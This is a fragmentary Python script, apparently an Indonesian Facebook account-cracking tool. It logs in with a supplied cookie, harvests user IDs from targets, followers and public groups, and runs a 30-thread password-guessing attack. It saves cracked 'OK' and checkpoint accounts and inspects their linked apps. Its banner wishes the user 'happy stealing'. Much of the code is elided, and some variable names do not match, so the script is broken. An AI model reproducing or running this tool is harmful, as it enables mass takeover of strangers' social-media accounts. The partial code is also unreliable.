...
\t     ┊┊╲╰╯┈╲▂╱┈╰╯╱┊┊
\t ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
      {m}➡️{k}➡️{h}➡️{sir} Author : Jun~Pakaya {x}{m}⪻{k}⪻{h}⪻{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t➪➫➬ WELCOME : [green]ＪｕｎＴｏｌｓ[white] 🤡'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}] Gunakan Cokies untuk login :{asu} ')
		...
		print(f'  {x}[{h}•{x}]{h} BERHASIL MASUK.........Masuk Ulang Ke Tols!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s GAGAL MASUK.....CEK LAGI TUMBAL KAMU !!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
...
def menu(my_name,my_id):
	...
	print('⋊ 5. Cek Results  ')
	print('⋊ 0. Keluar       ')
	_____jun__pakaya_____ = input('\n>> Pilih : ')
	if _____jun__pakaya_____ in ['1']:
		dump_massal()
	elif _____pakaya__pakaya_____ in ['2']:
		dump_follower()
	elif _____jun__pakaya_____ in ['3']:
		grup()
	elif _____jun__pakaya_____ in ['4']:
		crack_file()
	elif _____jun__pakaya_____ in ['5']:
		result()
	elif _____jun__pakaya_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Hapus Akses cookie ')
		exit()
	else:
		print('>> Pilih Yang Betul Yah Broツ ')
		back()
def error():
	print(f'{k}>> Kemungkinan Fitur Sedang Rusak {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	...
	if kz in ['2']:
		try:vin = os.listdir('CP')
			...
			print('>> File Tidak Ada bro ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> Results cp Tidak Ada ')
			time.sleep(2)
			back()
		else:
			cih = 0
...
def dump_massal():
	...
	try:
		...
		print('>> Masukkan Angka Bro, Bisa ngetik Kan? ')
		exit()
	if jum<1 or jum>100:
		print('>> Dump Janda Gagal Bro ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('>> Masukkan ID Target Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		...
		print(f'>>{k} Pertemanan Di Privat {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
	try:
		...
		exit()
	print('>> Ketik ( me ) Untuk Crack Penggikut Di Tumbal ')
	...
	try:
		...
		print('>> Wifi Tetanga Mati ')
		exit()
	except (KeyError,IOError):
		print('>> Mengumpulkan ID Gagal ')
		exit()
#------------------[ CRACK-GRUP ]-----------------#
balmond = b+"["+h+"✓"+b+"]"

def lah():
	print(f'\n{x}>> Total Janda Perawan Yang Berkumpul :{h} %s '%(len(id)))
...
def grup():
	print('')
	id = input(f'{x}>> Masukkan Username Atau Nama Grup Publik : ')
	...
	if berr2=='Masuk Facebook':
		print(" Terkena Limit, Silahkan Mode HeliKopter Dan Coba Lagi..")
		time.sleep(0.5)
		grup()
	elif berr2=='Kesalahan':
		alvino_xy('>> Grup Privat Mungkin ')
		time.sleep(0.5)
		grup()
	else:pass
...
def grup1(urls):
	use = []
	ses = requests.Session()
	print(f'{x}>> Dump Janda Di Proses ')
...
def crack_file():
	...
	if len(vin)==0:
		...
		try:geh = lol[geeh]
			...
			print(f'{k}>> Bisa Ngetik Gak? {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/JUNPAKAYA-DUMP/'+geh,'r').read().splitlines()
		except:
			print('>> File Gak Ada, Coba Lagi Tahun Depan ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
...
#			id2.insert(xx,bacot)
		...
		print('>> Bisa Ngetik Gak? ')
		exit()
	print('>> 1. Mobile (𝙎𝘼𝙉𝙂𝙂𝘼𝙏 𝙇𝘼𝙈𝘽𝘼𝙏)')
	print('>> 2. Mbasic \33[1;41m (𝙎𝙀𝘿𝙄𝙆𝙄𝙏 𝙇𝘼𝙈𝘽𝘼𝙏)\33[0m')
#	print('>> 3. Touch  (𝘽𝙀𝙏𝘼)')
#	print('>> 4. Mtouch (𝘽𝙀𝙏𝘼)')
	print('')
	hc = input('>> Pilih : ')
...
#		method.append('touch')
	...
	if _jembot_ in ['']:
		...
		taplikasi.append('no')
	pwplus=input('>> Pilih Y untuk menambahkan Katasandi ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] saya,suka,gay[white] '))
...
def passwrd():
	...
	print(f'>> Mode Helikopter Setiap {m}1k{x} Idz\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] Crack Berakhir, Tetap Bersyukur[cyan] ✓[white] '))
	...
	if woi in ['y','Y']:
		...
		print(f'\t{x}>>{k} Dah, sun dulu, umchha{x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
...
def cracktouch(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s ♨️ %s/%s ♨️ OK:%s ♨️ CP:%s ♨️ %s%s%s ♨️'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
...
def cek_opsi():
	...
	for kes in akun:
		try:
			...
			print('')
			li = '# WIFI TETANGGA MATI, SEPERTINYA ADA KETAHUAN:V'
...
def cek_apk(session,cookie):
	...
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] Gak Ada apk Aktif bre, sabar.")
	else:
	...
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] Sabar Bre, gk punya apk kalderuasa.")
	else:
		for i in range(len(game)):
...
if __name__=='__main__':
        ...
        alvino_xy(f'\n\t{x}{h}████████████████████▒▒▒▒░░░░░100%\n\t{x}︴ {h}𝙷𝙰𝙸 𝚂𝙴𝙻𝙰𝙼𝙰𝚃 𝙳𝙰𝚃𝙰𝙽𝙶 𝙳𝙸 𝚃𝙾𝙾𝙻𝚂 𝙹𝚄𝙽\n\t{x}︴ {h}Pastikan Wifi Tetangga Lancar Ya.\n\t{x}︴ {h}Semoga Hidupmu di Kelilingi janda.\n\t{x}︴ {h}Selamat Mencuri, semoga Berkah🙉\n\t{x}{h}╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗\n\t{x}{h}║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║\n\t{x}{h}╚╝ ╚═╩═╩═╩═╝ ═╚╝╚═╩═╝')
        time.sleep(3)
        login()
